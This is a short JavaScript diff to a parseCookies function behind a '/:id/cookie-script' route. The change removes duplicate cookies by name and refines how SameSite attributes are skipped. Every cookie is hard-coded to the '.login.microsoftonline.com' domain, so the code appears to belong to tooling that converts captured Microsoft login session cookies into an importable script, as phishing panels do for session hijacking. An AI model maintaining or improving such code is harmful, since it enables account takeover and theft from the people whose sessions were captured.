@@ -151,7 +151,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
 function parseCookies(cookieString) {
   if (!cookieString) return [];
 
-  var cookies = [];
+  var seenNames = {};
   var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
 
   for (var i = 0; i < pairs.length; i++) {
@@ -163,21 +163,30 @@ function parseCookies(cookieString) {
       var value = pair.substring(eqIndex + 1).trim();
       var nameLower = name.toLowerCase();
 
-      // Skip cookie attributes - must check for exact matches or startsWith
+      // Skip cookie attributes and their values
       if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
           nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
-          nameLower.startsWith('samesite')) {
+          nameLower === 'samesite' || nameLower.startsWith('samesite=')) {
         continue;
       }
 
       // Skip empty values
       if (!value || value.length === 0) continue;
 
-      cookies.push({
+      // Store unique cookies by lowercase name (last occurrence wins)
+      seenNames[nameLower] = {
         name: name,
         value: value,
         domain: '.login.microsoftonline.com'
-      });
+      };
+    }
+  }
+
+  // Convert object back to array
+  var cookies = [];
+  for (var key in seenNames) {
+    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
+      cookies.push(seenNames[key]);
     }
   }
 
